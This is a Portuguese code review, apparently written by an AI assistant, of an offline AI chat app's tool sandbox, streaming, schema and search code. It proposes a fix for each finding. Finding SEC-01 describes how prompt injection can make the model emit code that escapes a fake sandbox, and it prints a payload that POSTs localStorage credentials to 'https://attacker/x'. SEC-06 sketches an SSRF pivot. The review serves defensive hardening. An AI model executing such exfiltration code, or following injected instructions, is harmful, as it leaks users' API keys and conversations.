# Code Review — Offline AI Chat (Fase 4)

**Revisor**: Engenheiro Sênior + Segurança • **Data**: 2026-05-15 • **Branch**: `main` (working tree, pré-commit)
**Escopo**: RAG Progressivo, Model Comparison, Function Calling + Sandbox, módulos novos e arquitetura modular.
**Premissa imposta**: zero dependências no client. Toda sugestão aqui respeita isso.

## Sumário Executivo

| Severidade  | Segurança | Leak/Perf | Schema/Arq | Qualidade | Total |
|-------------|-----------|-----------|------------|-----------|-------|
| 🔴 Crítico  | 1         | 2         | 0          | 0         | **3** |
| 🟠 Alto     | 3         | 3         | 0          | 1         | **7** |
| 🟡 Médio    | 1         | 2         | 3          | 2         | **8** |
| 🔵 Baixo    | 2         | 2         | 1          | 2         | **7** |
| 🟣 Nit      | —         | —         | —          | —         | **6** |
| **Total**   | **7**     | **9**     | **4**      | **5**     | **31** |

**TL;DR**:
1. O "sandbox" de `run_javascript` **não isola nada** — modelo via prompt injection pode ler `localStorage` e exfiltrar conversas, apiKey e baseUrl. Prioridade #1.
2. `readStream` em `api.js` não libera o reader em erro/abort e não limita buffer. Vazamento de socket + DoS via stream sem `\n`.
3. `runtime.abortController` é compartilhado entre N requisições do tool cycle e entre execução de sandbox + LLM — efeitos colaterais sutis quando o usuário cancela.
4. `requireConfirmation` para tools é um TODO stub: a flag existe no schema mas a UI não pergunta nada — tools executam silenciosamente.
5. Soft migrations em `schema.js` são *shallow*: campos novos dentro de objetos aninhados não chegam em usuários com config antigo.

---

## 🔴 Críticos

### [SEC-01] Sandbox de `run_javascript` não isola nada — exfiltra `localStorage`

**Arquivo**: `modules/tools/manager.js:155-181`
**Categoria**: Segurança — Sandbox escape / Prompt injection

**Código atual**:
```js
export async function runInSandbox(code, args, timeoutMs = 5000) {
  return new Promise((resolve) => {
    const timer = setTimeout(() => resolve("Erro: timeout..."), timeoutMs);
    try {
      const fn = new Function(
        "window", "document", "fetch", "XMLHttpRequest", "args",
        `"use strict"; ${code}`
      );
      const result = fn(undefined, undefined, undefined, undefined, args);
      // ...
```

**Risco**:
Mascarar 4 identificadores via parâmetros não é isolamento — apenas *shadowing* léxico. O código gerado pelo modelo continua tendo acesso a:
- `globalThis`, `self`, `top`, `parent`, `frames`, `window.parent`
- `localStorage`, `sessionStorage`, `indexedDB`
- `eval`, `Function` (criar nova função sem shadowing), `import()`
- `navigator`, `history`, `crypto`, `caches`
- `postMessage` para o próprio top
- `document` via `globalThis.document`

**Exemplo de payload via prompt injection** (modelo recebe instrução no contexto):
```js
// Modelo retorna isto como código a executar
return Object.entries(globalThis.localStorage).reduce((a,[k,v]) => a + k + '=' + v + '\n', '');
```
ou pior:
```js
return fetch('https://attacker/x', { method:'POST', body: localStorage.getItem('offline-ai-chat:v2') });
```
(o param `fetch` está sombreado mas `globalThis.fetch` não está.)

`localStorage["offline-ai-chat:v2"]` contém: `apiKey`, `baseUrl` de todos os servidores, conversas (se `persistConversations`), `APP_AUTH_PASSWORD` não — mas qualquer credencial colada em `headers`/`apiKey` está lá.

**Severidade**: Crítica porque a tool fica ligada por padrão no perfil `developer` (`schema.js:31`: `tools: ["builtin-run_javascript"]`) e a descrição "Sem acesso a DOM, fetch ou rede" induz o usuário a habilitar sem desconfiança.

**Patch sugerido** (zero-deps):
Executar em `<iframe sandbox="allow-scripts">` cross-origin via `srcdoc`, com `postMessage` para entrada/saída. `sandbox="allow-scripts"` (sem `allow-same-origin`) cria uma origem opaca — `localStorage`, cookies do parent e DOM ficam inacessíveis. Esqueleto:
```js
export async function runInSandbox(code, args, timeoutMs = 5000) {
  return new Promise((resolve) => {
    const iframe = document.createElement("iframe");
    iframe.sandbox = "allow-scripts";  // sem allow-same-origin
    iframe.style.display = "none";
    const nonce = crypto.randomUUID();
    const html = `<!doctype html><script>
      (async () => {
        try {
          const fn = new Function("args", ${JSON.stringify(`"use strict"; ${code}`)});
          const out = await fn(${JSON.stringify(args)});
          parent.postMessage({ nonce: ${JSON.stringify(nonce)}, ok: true, value: out }, "*");
        } catch (e) {
          parent.postMessage({ nonce: ${JSON.stringify(nonce)}, ok: false, error: e.message }, "*");
        }
      })();
    <\/script>`;
    iframe.srcdoc = html;
    const cleanup = () => { iframe.remove(); window.removeEventListener("message", onMsg); clearTimeout(timer); };
    const onMsg = (ev) => {
      if (ev.source !== iframe.contentWindow || ev.data?.nonce !== nonce) return;
      cleanup();
      resolve(ev.data.ok ? serializeToolResult(ev.data.value) : `Erro na execução: ${ev.data.error}`);
    };
    const timer = setTimeout(() => { cleanup(); resolve("Erro: timeout..."); }, timeoutMs);
    window.addEventListener("message", onMsg);
    document.body.appendChild(iframe);
  });
}
```
Notas: `srcdoc` herda a origem do parent mas `sandbox` sem `allow-same-origin` força origem opaca; storage e document do parent ficam inacessíveis. Validar o `event.source` evita confusion com outros postMessage.

---

### [LEAK-01] `readStream` não libera reader em erro/abort + buffer sem limite

**Arquivo**: `modules/api.js:89-125`
**Categoria**: Leak + DoS

**Código atual**:
```js
export async function readStream(response, onDelta) {
  const reader = response.body.getReader();
  const decoder = new TextDecoder("utf-8");
  let buffer = "";
  // ...
  while (true) {
    const { done, value } = await reader.read();
    if (done) break;
    buffer += decoder.decode(value, { stream: true });
    const lines = buffer.split(/\r?\n/);
    buffer = lines.pop() || "";
    // ...
  }
}
```

**Risco**:
1. **Sem try/finally**: se `signal.abort()` faz `reader.read()` rejeitar, o reader fica em estado *locked* indefinido. O socket TCP fica em CLOSE_WAIT até GC do response. Em sessões longas com muito Stop manual isso acumula.
2. **Buffer ilimitado**: um servidor adversário (ou um modelo travado em loop de tokens sem newline) pode enviar megabytes em uma única linha. `buffer += decode(value)` sem cap = OOM do tab.
3. **`onDelta` que lança exceção** quebra todo o loop e mantém reader vivo.

**Patch sugerido**:
```js
export async function readStream(response, onDelta) {
  const reader = response.body.getReader();
  const decoder = new TextDecoder("utf-8");
  const MAX_BUFFER = 1 << 20;  // 1 MiB de linha sem \n é hostil
  let buffer = "";
  let content = "", reasoning = "", usage = null, finishReason = null;
  try {
    while (true) {
      const { done, value } = await reader.read();
      if (done) break;
      buffer += decoder.decode(value, { stream: true });
      if (buffer.length > MAX_BUFFER) throw new Error("SSE buffer overflow (linha sem \\n).");
      const lines = buffer.split(/\r?\n/);
      buffer = lines.pop() || "";
      for (const line of lines) {
        // ... idêntico
      }
    }
    return { content, reasoning, usage, finishReason };
  } finally {
    try { await reader.cancel(); } catch {}
  }
}
```

---

### [LEAK-02] `runtime.abortController` compartilhado entre tool cycle + sandbox

**Arquivo**: `app.js:784, 923-926, 963-1049, 982`
**Categoria**: Leak + race condition

**Código atual** (resumido):
```js
// app.js:784
runtime.abortController = new AbortController();
// app.js:842
{ ..., signal: runtime.abortController.signal }
// app.js:923-926
await runToolCycle(toolCalls, ..., { ...useStreaming });
return;  // outer finally só roda depois disso
// app.js:982 dentro de runToolCycle
const result = await executeTool(tc, allTools, { signal: runtime.abortController?.signal });
// app.js:1032
{ ..., signal: runtime.abortController?.signal }  // requisição seguinte do ciclo
```

**Risco**:
- **Cancel cascata**: um `abort()` mata *toda* a árvore de tool calls. OK em alguns casos, mas o usuário não consegue cancelar só a iteração atual e manter o resultado parcial.
- **Sandbox não respeita abort**: `runInSandbox` usa `setTimeout` mas **não** lê `options.signal`. Se o usuário aperta Stop durante um `run_javascript` lento, o JS dentro do `new Function` continua rodando até o timer (5s) ou conclusão. O `executeTool` segura o ciclo nesse tempo.
- **Reuse depois de abort**: se `abort()` foi chamado mas `runtime.abortController` ainda aponta para esse controller, próximas requests no ciclo recebem signal já-abortado → cada uma rejeita com `AbortError`, mas o loop não sabe disso até await voltar.

**Patch sugerido** (parte 1 — controller por iteração):
```js
async function runToolCycle(toolCalls, ..., context, depth = 1) {
  if (runtime.abortController?.signal?.aborted) return;  // bail early
  // ... loop de tools
  // antes do next completion:
  const iterCtrl = new AbortController();
  const composite = AbortSignal.any([iterCtrl.signal, runtime.abortController.signal]);
  await requestCompletion({ ..., signal: composite }, ...);
}
```
(parte 2 — sandbox respeita signal):
```js
export async function runInSandbox(code, args, timeoutMs = 5000, signal) {
  return new Promise((resolve) => {
    const onAbort = () => { cleanup(); resolve("Erro: cancelado pelo usuário."); };
    signal?.addEventListener("abort", onAbort, { once: true });
    // ... resto, com cleanup() removendo o listener
  });
}
```
e passar `options.signal` em `executeTool` → `runInSandbox`.

---

## 🟠 Altos

### [SEC-02] URLs do DuckDuckGo retornadas sem validação de scheme

**Arquivo**: `server.js:1156-1179`
**Categoria**: Segurança — XSS via redirect manipulado

**Código atual**:
```js
const linkMatch = /href="([\s\S]*?)"/.exec(block);
// ...
results.push({
  title: ...,
  url: linkMatch[1],   // <-- string crua
  snippet: ...
});
```

**Risco**: DDG hoje devolve URLs como `//duckduckgo.com/l/?uddg=ENCODED`, mas a regex é frágil e qualquer mudança no markup pode entregar `javascript:`, `data:text/html`, ou `blob:`. O client (`modules/tools/manager.js:146` → `serializeToolResult`) converte para JSON e enfia no contexto do modelo. Se o modelo cita a URL e o usuário clica em um link renderizado, XSS via `<a href="javascript:...">`.

**Patch sugerido** (decodifica o redirect e valida o scheme):
```js
function safeExtractUrl(rawHref) {
  try {
    let u = new URL(rawHref, "https://duckduckgo.com");
    if (u.host.endsWith("duckduckgo.com") && u.pathname === "/l/") {
      const inner = u.searchParams.get("uddg");
      if (inner) u = new URL(inner);
    }
    if (u.protocol !== "http:" && u.protocol !== "https:") return null;
    return u.toString();
  } catch { return null; }
}

if (titleMatch && linkMatch) {
  const url = safeExtractUrl(linkMatch[1]);
  if (!url) continue;
  results.push({ title: ..., url, snippet: ... });
}
```

---

### [SEC-03] Web search sem timeout em `https.get`

**Arquivo**: `server.js:1129-1153`
**Categoria**: Segurança — DoS por socket pendente

**Código atual**:
```js
https.get(url, options, (res) => { /* ... */ }).on("error", reject);
```
Sem `req.setTimeout`. Se DDG enforcar (rate limit, soft block), o socket fica vivo até TCP keepalive (~2h em Linux por default) consumindo file descriptor.

**Patch sugerido**:
```js
const req = https.get(url, options, (res) => { /* ... */ });
req.setTimeout(10_000, () => { req.destroy(new Error("timeout")); });
req.on("error", reject);
```

---

### [SEC-04] `/api/tools/web-search` fora do `rateLimited()`

**Arquivo**: `server.js:387-389` (rota) vs `server.js:437-448` (rate limiter)
**Categoria**: Segurança — Abuse path

**Código atual**:
```js
// handleApi
if (pathname === "/api/tools/web-search") {
  return handleToolsWebSearch(body, response);   // <-- não chama rateLimited
}
```
`rateLimited` é aplicado em `handleFsList`, `handleFsRead`, `handleFsReadPdf`, `handleFsSearch` (linhas 557, 580, 611, 669). Web search é o único endpoint que faz fetch para a internet — deveria ter um budget *mais* apertado, não nenhum.

**Patch sugerido**:
```js
async function handleToolsWebSearch(body, response, request) {
  if (rateLimited(request)) {
    return sendJson(response, 429, { error: "Muitas buscas, aguarde." });
  }
  // ... resto
}
```
E passar `request` na chamada em linha 388.

---

### [LEAK-03] Sandbox de `run_javascript` ignora `options.signal`

**Arquivo**: `modules/tools/manager.js:122, 155-181`
**Categoria**: Leak / UX bug (descrito em LEAK-02 mas separado porque o fix é localizado)

**Risco**: Quando o ciclo de tools chama `executeTool(tc, allTools, { signal: runtime.abortController?.signal })`, o caminho `run_javascript` → `runInSandbox(args.code, {})` **descarta o signal** e ainda passa `{}` em vez de `args`. Dois bugs:
1. Cancel não interrompe execução do sandbox.
2. `args` da tool call são descartados na chamada manual de `run_javascript` (mas o schema só define `code`, então é benigno hoje — vira bug no dia que adicionar `inputData`).

**Patch sugerido**: ver patch parte 2 do LEAK-02.

---

### [LEAK-04] `renderToolCallBlock` cria bloco duplicado em vez de atualizar

**Arquivo**: `app.js:974-988`
**Categoria**: Perf + UX

**Código atual**:
```js
const block = renderToolCallBlock(assistantBody, tc);
// ...
const result = await executeTool(tc, allTools, ...);
renderToolCallBlock(assistantBody, tc, result);
// Nota: renderToolCallBlock cria um novo, mas queremos atualizar o existente.
```
O próprio comentário do autor admite o bug. Após N tools por mensagem, o DOM tem 2N blocos visuais e o usuário vê duas vezes a mesma tool call (uma "Executando…" parada para sempre, outra "Resultado: …").

**Patch sugerido**: `renderToolCallBlock` retorna referência ao elemento criado; segunda chamada recebe o ref e patcha `.tool-result` em vez de re-appendar.

---

### [QUAL-01] `requireConfirmation` é stub — tools executam sem perguntar

**Arquivo**: `app.js:970, 977-980`
**Categoria**: Segurança UX + falsa promessa no schema

**Código atual**:
```js
const requireConfirm = store.get("advanced.tools.requireConfirmation");
// ...
if (requireConfirm) {
  // TODO: Implementar confirmação na UI se necessário. 
  // Por ora, seguimos direto ou falhamos se for vital.
}
```
A flag está na UI de Settings e no schema (`schema.js:188-190`) mas o branch só tem comentário TODO. Se o usuário ativa "exigir confirmação", **nada muda** — tools como `web_search` e `run_javascript` (e tools custom de terceiros) executam silenciosamente.

**Patch sugerido**: implementar modal de confirmação simples antes do `await executeTool`. Pode ser um `<dialog>` injetado com promise:
```js
async function confirmToolCall(tc) {
  return new Promise((resolve) => {
    const dlg = document.createElement("dialog");
    dlg.innerHTML = `<p>Executar <strong>${tc.function.name}</strong>?</p>
      <pre>${escapeHtml(tc.function.arguments)}</pre>
      <menu><button value="cancel">Cancelar</button><button value="ok">Executar</button></menu>`;
    document.body.appendChild(dlg);
    dlg.addEventListener("close", () => { resolve(dlg.returnValue === "ok"); dlg.remove(); }, { once: true });
    dlg.showModal();
  });
}
// no loop:
if (requireConfirm && !(await confirmToolCall(tc))) {
  renderToolCallBlock(assistantBody, tc, "(cancelado pelo usuário)");
  continue;
}
```
Enquanto não tem UI, **trocar default para `true`** ou remover a flag do schema. Hoje o nome promete proteção que não existe.

---

### [PERF-01] Editor inline re-renderiza markdown a cada keystroke

**Arquivo**: `modules/ui/chat.js:318-320`
**Categoria**: Perf — jank

**Código atual**:
```js
textarea.addEventListener("input", () => {
  preview.replaceChildren(renderMarkdown(textarea.value));
});
```

**Risco**: para mensagens grandes (>5k chars com tabelas e code blocks), cada tecla dispara um parse completo. Em laptops modestos vira jank visível (~30-80ms de input lag).

**Patch sugerido** (debounce):
```js
let renderTimer = null;
textarea.addEventListener("input", () => {
  clearTimeout(renderTimer);
  renderTimer = setTimeout(() => {
    preview.replaceChildren(renderMarkdown(textarea.value));
  }, 120);
});
// cleanup quando fecha editor:
function closeInlineEditor(save) { clearTimeout(renderTimer); /* ... */ }
```

---

## 🟡 Médios

### [SCHEMA-01] Soft migrations não são recursivas

**Arquivo**: `modules/schema.js:325, 348-366`
**Categoria**: Schema / robustez

**Código atual**:
```js
const target = ok ? data : { ...defaults(), ...parsed, schemaVersion: SCHEMA_VERSION };
```
e tratamentos manuais campo-a-campo para `target.rag.reranking`, `target.tools`, `target.advanced.tools`. Funciona para os campos conhecidos hoje, mas:

**Risco**: Quando alguém adicionar `rag.reranking.candidateK = 20` num próximo PR e um usuário tem `rag.reranking = { enabled: true }` (sem o `candidateK`), o `candidateK` fica `undefined`, código a jusante usa `undefined`/NaN, bug silencioso.

**Patch sugerido**: utilitário deep-merge com regra clara — *só preencher se o usuário não tem o campo*; nunca sobrescrever valor não-`undefined` do usuário; preservar arrays como atômicos (não merge item-a-item):
```js
function mergeMissing(base, override) {
  if (Array.isArray(override) || typeof override !== "object" || override === null) return override;
  const out = Array.isArray(base) ? [...base] : { ...base };
  for (const k of Object.keys(override)) {
    if (out[k] === undefined) out[k] = override[k];
    else if (typeof out[k] === "object" && out[k] !== null && !Array.isArray(out[k]))
      out[k] = mergeMissing(out[k], override[k]);
  }
  return out;
}
// uso: const target = mergeMissing(parsed, defaults()); target.schemaVersion = SCHEMA_VERSION;
```
Isso deprecia os bloquinhos manuais de linhas 348-366.

---

### [SCHEMA-02] `validate()` aceita formas parcialmente corruptas

**Arquivo**: `modules/schema.js:307-316`
**Categoria**: Schema / robustez

**Código atual**:
```js
if (!obj.connection || !Array.isArray(obj.connection.servers) || !obj.connection.servers.length) {
  errors.push("connection.servers vazio");
}
if (!Array.isArray(obj.profiles) || !obj.profiles.length) errors.push("profiles vazio");
return { ok: errors.length === 0, errors, data: obj };
```

**Risco**: se um server na lista é `null` (corrupção parcial), ou se profile não tem `sampling`, validate retorna `ok: true` e o código a jusante explode em `obj.profiles[0].sampling.temperature`.

**Patch sugerido**: validar shape mínimo de cada item crítico — `servers.every(s => s && typeof s.baseUrl === "string")`, `profiles.every(p => p && p.sampling && typeof p.sampling === "object")`. Se falha, descartar item ruim ou regenerar fresh.

---

### [SCHEMA-03] `migrate v1→v2` perde dados

**Arquivo**: `modules/schema.js:274-304`
**Categoria**: Schema / dados do usuário

**Risco**: usuários migrando da v1 perdem prompt library, slash commands, RAG config, tools — só 7 campos top-level são copiados. Isso é decisão consciente (CLAUDE.md histórico item 13), mas vale documentar via comentário ou warning visível no UI ("Configurações antigas foram migradas. Re-configure RAG e prompts.").

**Patch sugerido**: adicionar `console.warn` + toast informativo:
```js
const v2 = migrateV1ToV2(v1);
toast("Configurações foram atualizadas para v2. Revise RAG, prompts e tools em Settings.", "info", 8000);
```

---

### [RAG-01] Chunks com dimensionalidade errada ainda vão pro ranking

**Arquivo**: `modules/rag/retriever.js:23-32`
**Categoria**: RAG / correção

**Código atual**:
```js
for (let i = 0; i < chunks.length; i++) {
  const c = chunks[i];
  if (!c.vec || c.vec.length !== dim) {
    scored[i] = { ...c, score: -1 };
    continue;
  }
  scored[i] = { ...c, score: dot(queryVec, c.vec) };
}
scored.sort((a, b) => b.score - a.score);
```

**Risco**: chunks com `score=-1` ficam no fim do sort mas se o índice tem **só** chunks com dim errado (cenário: troca de embedder sem re-indexar), o top-K retorna lixo com `score=-1`. Hoje o pipeline trata isso checando `embeddingModel` antes (manager.js rejeita com erro claro), mas é uma defesa em profundidade.

**Patch sugerido**:
```js
const valid = [];
for (const c of chunks) {
  if (!c.vec || c.vec.length !== dim) continue;
  valid.push({ ...c, score: dot(queryVec, c.vec) });
}
valid.sort((a, b) => b.score - a.score);
// usar `valid` no resto da função
```

---

### [PERF-02] `populateModelSelect` herda optgroups stale via `window.runtime.models`

**Arquivo**: `modules/ui/comparison.js:250-277`
**Categoria**: Perf + correção

**Código atual**:
```js
const models = window.runtime?.models || [];
// ...
select.innerHTML = '<option value="">Selecione um modelo...</option>';
groups.forEach(g => { /* cria optgroups */ });
```
`innerHTML = ...` limpa antes — então **não há duplicação de optgroups** (revisei minha suspeita inicial; o código está correto aqui).

**Risco residual**: acesso a `window.runtime?.models` cria acoplamento implícito entre `app.js` e `comparison.js`. Se `comparison.js` é aberto antes do `app.js` popular `window.runtime.models`, o select fica vazio para sempre — não há `subscribe()` para repopular. Usuário só vê opções se trocar para um perfil e voltar.

**Patch sugerido**: expor models via store em vez de `window.runtime`:
```js
// em app.js, após carregar:
store.set("runtime.models", models);
// em comparison.js:
const unsub = store.subscribe("runtime.models", () => repopulateAll());
// guardar unsub no closeComparison
```

---

### [LEAK-05] `setTimeout` do botão Copiar em comparison não é cancelado

**Arquivo**: `modules/ui/comparison.js:222-229`
**Categoria**: Leak — minor

**Código atual**:
```js
copyBtn.addEventListener("click", () => {
  // ...
  setTimeout(() => copyBtn.textContent = oldText, 2000);
});
```
Se o usuário troca de painel/fecha comparação no intervalo dos 2s, o timer ainda dispara e tenta setar textContent em nó destacado. Não vaza memória (nó é GC'd), mas log de unhandled error pode aparecer em Firefox.

**Patch sugerido**: guardar id do timer em closure local e cancelar em `closeComparison`/clique repetido:
```js
let copyTimer = null;
copyBtn.addEventListener("click", () => {
  clearTimeout(copyTimer);
  // ...
  copyTimer = setTimeout(() => { copyBtn.textContent = oldText; copyTimer = null; }, 2000);
});
```

---

### [QUAL-02] Listener `document.click` em menu de regen pode ficar órfão

**Arquivo**: `modules/ui/chat.js:258-264`
**Categoria**: Leak — minor

**Código atual**:
```js
const close = (ev) => {
  if (!menu.contains(ev.target)) {
    menu.remove();
    document.removeEventListener("click", close, true);
  }
};
setTimeout(() => document.addEventListener("click", close, true), 0);
```
Quando o usuário clica em um *item* do menu (linha 246-249 → `menu.remove()`), o listener em `document` **não é removido** (a remoção só roda quando o click é fora). Próximo click outside dispara `close` com menu detached, `menu.contains(...)` retorna false, listener se auto-remove. Ou seja: 1 listener stale extra por abertura, removido no próximo click qualquer. Não é vazamento permanente, mas é sujo.

**Patch sugerido**: chamar `close({ target: document.body })` (ou guardar e remover diretamente) no handler de seleção de item.

---

## 🔵 Baixos

### [SEC-05] CSP permite `'unsafe-inline'` em scripts

**Arquivo**: `server.js:86-102`

`script-src 'self' 'unsafe-inline'`. Vale auditar quem usa inline script — se for só `<script type="module">` em `index.html`, basta um nonce/hash. Hoje o uso de inline `<style>` é o que aparece nos templates; talvez `'unsafe-inline'` em script-src seja vestigial.

**Patch sugerido**: investigar e, se sobrar, mover para CSP estritamente `script-src 'self'`. Defense in depth — não há XSS conhecido hoje, mas SEC-02 mostra que pode aparecer.

---

### [SEC-06] SSRF em modo local quando `ALLOWED_LM_HOSTS` está vazio

**Arquivo**: `server.js:241-249`

**Código atual**:
```js
function isAllowedProxyTarget(url) {
  if (ALLOWED_LM_HOSTS.length) { /* whitelist */ }
  if (LAN_BIND) return isLoopbackHostname(url.hostname);
  return true;  // <-- aceita qualquer host quando HOST=127.0.0.1
}
```
Em modo loopback (default), o proxy aceita `baseUrl` para qualquer host. Browser de outra origem não consegue chegar (o server é loopback), mas um app *local* hostil (extensão de browser, processo malicioso) pode fazer `POST 127.0.0.1:8080/api/chat/completions` com `baseUrl: http://192.168.1.1/admin` e usar o servidor como SSRF pivot.

Mitigação atual: a UI envia `baseUrl` controlado pelo usuário, então é difícil de explorar sem comprometer o browser. Mas vale logar warning no startup.

**Patch sugerido**: imprimir aviso em startup quando `ALLOWED_LM_HOSTS` está vazio e `LAN_BIND` é false. E considerar block de RFC1918 + link-local quando whitelist vazia mesmo em modo local (whitelist só `localhost`/`127.0.0.1` por default).

---

### [PERF-03] Reranker tem comentário inconsistente com código

**Arquivo**: `modules/rag/reranker.js:36-40` (citado pela exploração; vale conferir e corrigir)
**Categoria**: Qualidade

**Risco**: comentário diz "sequencial" mas código faz `Promise.all`. Confunde leitor futuro e pode mascarar bug se LM Studio rate-limita. Auditar e decidir: sequencial real (await em loop) ou paralelo (e atualizar comentário).

---

### [PERF-04] `cosine` em loop JS sem SIMD para datasets grandes

**Arquivo**: `modules/rag/retriever.js:141-146`
**Categoria**: Perf — futuro

Em datasets de 10-50k chunks com 2560 dim (Qwen3), o loop simples já leva 50-150ms. Não é gargalo ainda, mas se o RAG escalar:
- Considerar Web Worker para offload (sem dep nova).
- Considerar SIMD via `Float32Array` e `Math.fround`/unroll de loop.

Nit hoje, mas vale documentar como TODO no arquivo.

---

### [QUAL-03] `rebuildModelServerMap` é stub vazio

**Arquivo**: `modules/ui/comparison.js:134-149`

A função tem corpo vazio dentro do `forEach` (linhas 144-148 todos comentários). Toda a lógica real está em `populateModelSelect` via `window.runtime?.models`. Renomear ou remover — função morta confunde.

---

### [QUAL-04] Branch `if (renderToolCallBlock) ...` cria bloco solto

**Arquivo**: `app.js:985` (cf. LEAK-04)

Já coberto em LEAK-04; rebaixado para nota: o comentário "executeTool é rápido o suficiente que o 'loading' mal aparece" só é verdade para `get_current_datetime`. Para `web_search` (~500ms-3s) e `run_javascript` (~timeout), o usuário vê dois blocos.

---

### [SCHEMA-04] `loadAndMigrate` salva config de volta apenas no path v1→v2

**Arquivo**: `modules/schema.js:318-389`

Soft migrations alteram `target` em memória, mas **não chamam `persist(target)`**. Próxima sessão refaz as mesmas soft migrations. Inofensivo (idempotente), mas dispara o "embedding bumped" toast (se houver) toda vez.

**Patch sugerido**: persistir após qualquer soft migration que mudou o objeto.

---

## 🟣 Nits

- **Mistura PT/EN em comentários**: `modules/api.js` (EN), `modules/tools/manager.js` (PT), `app.js` (PT majoritário com pedaços em EN). Padronizar para PT.
- **`extractDelta` em `api.js`**: zero testes unit. Property-based test para chunks malformados (`{}`, `{choices: []}`, `{choices: [{delta: null}]}`) seria barato e útil.
- **`parseDuckDuckGoHtml`**: regex frágil contra mudança de markup DDG. Mover para parser stateful pequeno ou aceitar quebra silenciosa e logar.
- **`modules/schema.js:defaults()`**: 130 linhas. Quebrar em `defaultConnection()`, `defaultRag()`, `defaultWorkspace()` etc. para leitura.
- **`comparison.js`**: copy button usa `copyBtn.textContent = "Copiado!"` enquanto resto do app usa toasts — inconsistência de UX.
- **`app.js` 1800+ linhas**: orquestração de RAG strategy (linhas 420-546 segundo exploração) cabe num módulo dedicado `modules/rag/strategy.js`. Reduz tamanho de `app.js` e isola lógica testável.

---

## Apêndice A — Dívidas técnicas observadas

- **`window.runtime` como bus global**: `comparison.js` lê `window.runtime?.models`. Acoplamento que escapa do store. Migrar para o store reativo já existente (`store.js`).
- **Tool result rendering inacabado**: comentário em `app.js:986-988` reconhece o problema; o autor já planejou a refatoração de `renderToolCallBlock` para retornar ref.
- **`requireConfirmation` no schema sem UI** (QUAL-01): exemplo de "schema documenta promessa que código não cumpre" — vale auditar outras flags em `advanced.*` na mesma situação.
- **`migrate v1→v2`** assume um usuário hipotético com config antiga; passou tempo suficiente que se nenhum usuário relatou problemas em migração, vale considerar deprecar e mostrar tela explícita "configuração legada detectada".

## Apêndice B — Refatorações zero-deps friendly

1. **Sandbox em iframe `srcdoc + sandbox`** (SEC-01) — não exige dep, ganha isolamento real.
2. **`AbortSignal.any([a, b])`** para tool cycle (LEAK-02) — disponível em todos os browsers desde 2024.
3. **`<dialog>` para confirmação de tool** (QUAL-01) — nativo, sem dep.
4. **Web Worker para cosine em batches >5k chunks** (PERF-04) — `new Worker(new URL(...))` direto.
5. **`mergeMissing` recursivo** (SCHEMA-01) — 15 linhas, substitui blocks manuais.
6. **Store reativo para `runtime.models`** (PERF-02) — usa infraestrutura que já existe.

---

## Como agir

Sugestão de ordem de execução (cada um é um PR pequeno):

1. **SEC-01** (sandbox iframe) — afeta segurança real, mexe em 1 função.
2. **LEAK-01** (SSE try/finally + buffer cap) — 10 linhas, baixo risco.
3. **QUAL-01** (`requireConfirmation` real ou remover do schema).
4. **SEC-02 + SEC-03 + SEC-04** (web search hardening) — todos em `server.js`, podem ir juntos.
5. **LEAK-02 + LEAK-03** (tool cycle abort + sandbox respeita signal).
6. **LEAK-04** (renderToolCallBlock atualiza in-place).
7. **SCHEMA-01** (`mergeMissing` recursivo).
8. Restante por oportunidade.

Cada finding tem ID estável (`[SEC-01]`, `[LEAK-01]`, etc.). Para implementar, peça por ID — ex: *"implementa SEC-01 e LEAK-01"* — que aplico o patch correspondente.
